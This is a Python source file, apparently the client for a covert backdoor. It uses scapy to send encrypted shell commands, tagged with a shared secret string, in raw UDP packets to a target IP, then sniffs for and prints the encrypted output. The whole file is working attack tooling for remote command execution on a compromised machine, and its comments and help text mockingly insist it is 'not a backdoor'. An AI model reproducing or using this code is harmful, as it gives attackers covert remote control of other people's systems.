import crypto
import argparse
import logging
# supress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# string to use as unique identification for our backdoor
# we use this because ports might not be unique enough in all situations
# if you want to change this to another value make sure both the client and
# backdoor have the same string
authString = "This is not a backdoor"

def packetFunc(packet):
  # scapy is garbage and get's arp packet even though we're filtering
  if ARP not in packet:
    encryptedData = packet['Raw'].load
    data = crypto.decrypt(encryptedData)
    if data.startswith(authString):
      data = data[len(authString):]
      print data

parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port of packets to send.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port of packets to send.'
                   , required=True)
parser.add_argument('-ip'
                   , '--destIP'
                   , dest='destIP'
                   , help='Destination IP'
                   , required=True)
args = parser.parse_args()

command = "ls -l"
sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
while True:
  command = raw_input("Command? (exit to end) ")
  if command == "exit":
    sys.exit()
  else:
    encryptedCommand = crypto.encrypt((authString + command))
    packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
    send(packet, verbose=0)
    sniff(filter=sniffFilter,prn=packetFunc, count=1)

